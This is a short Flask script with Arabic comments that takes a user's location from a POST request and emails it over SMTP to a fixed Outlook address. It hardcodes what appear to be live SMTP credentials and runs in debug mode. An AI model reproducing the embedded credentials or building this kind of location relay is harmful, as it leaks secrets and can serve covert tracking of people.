import smtplib
from email.mime.text import MIMEText
from flask import Flask, request, jsonify

app = Flask(__name__)

# إعدادات SMTP
SMTP_SERVER = "smtp.mailersend.net"
SMTP_PORT = 587
SENDER_ADDRESS = "MS_fLonPd@trial-351ndgw2mvqgzqx8.mlsender.net"
SENDER_PASS = "53rvL5nt4mwfRmdG"
RECEIVER_ADDRESS = "imobilejo@outlook.com"

@app.route('/', methods=['POST'])
def send_email():
    data = request.get_json()
    location = data['location']

    subject = 'موقع المستخدم'
    body = f'الموقع الجغرافي للمستخدم هو: {location}'

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = SENDER_ADDRESS
    msg['To'] = RECEIVER_ADDRESS

    try:
        # إعداد SMTP لإرسال البريد
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SENDER_ADDRESS, SENDER_PASS)
            server.sendmail(SENDER_ADDRESS, RECEIVER_ADDRESS, msg.as_string())
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    app.run(debug=True)
